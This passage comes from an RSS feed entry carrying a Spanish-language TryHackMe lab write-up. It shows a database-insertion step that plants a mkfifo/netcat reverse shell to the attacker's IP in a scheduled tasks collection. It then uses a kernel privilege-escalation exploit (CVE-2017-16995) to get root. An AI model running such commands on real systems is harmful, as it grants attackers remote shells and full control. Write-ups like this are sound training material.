&lt;p&gt;En la carpeta &lt;code&gt;/var/scheduler&lt;/code&gt; encontramos una aplicacion la cual contiene una base de datos distinta, y la cual se ejecuta cada 30 segundos, ademas de eso vemos entre los procesos en ejecucion que esta aplicacion la esta ejecutando el usuario tom. La aplicacion realiza una iteracion en la tabla tasks y la ejecuta, luego la elimina.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_015512.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Insertamos una shell inversa en la tabla tasks (coleccion):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;db.tasks.insert&lt;span class=&#34;o&#34;&gt;({&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;cmd&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.8.1.72 1338 &amp;gt;/tmp/f&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_020646.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Despues de 30 segundos se ejecuta nuestra shell inversa y obtenemos una shell con el usuario tom y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_020718.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Vemos la version del kernel y buscamos la misma en searchsploit, vemos que existe un exploit que nos puede ayudar a escalar privilegios.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_021149.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/44298&#34;&gt;&lt;strong&gt;CVE-2017-16995&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Lo compilamos, descargamos en la maquina, le damos permisos de ejecucion, lo ejecutamos y obtenemos una shell con usuario root y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_021318.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/nodeone/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/nodeone/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>xxd</category>
            
          
            
              <category>nodejs</category>
            
          
            
              <category>kernel</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      

    
  </channel>
</rss>